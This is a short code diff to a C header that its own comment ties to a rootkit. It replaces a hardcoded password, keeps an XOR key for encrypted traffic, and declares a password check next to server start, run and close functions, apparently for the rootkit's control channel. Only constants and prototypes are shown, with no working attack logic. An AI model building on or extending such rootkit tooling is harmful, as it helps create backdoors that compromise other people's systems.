@@ -6,7 +6,7 @@
 #include <stddef.h>
 
 /* Must match rootkit */
-#define WLKOM_PASSWORD  "wlk0m_s3cr3t"
+#define WLKOM_PASSWORD  "zop3p_v6fub3w"
 #define CRYPTO_KEY      "wlk0m_xor_k3y_32bytes_padding__"
 #define CRYPTO_KEYLEN   32
 
@@ -30,6 +30,7 @@ typedef struct {
 } client_t;
 
 int  server_init(int port);
+int  check_password(void);
 void server_run(int srv_fd);
 void server_close(int srv_fd);
 
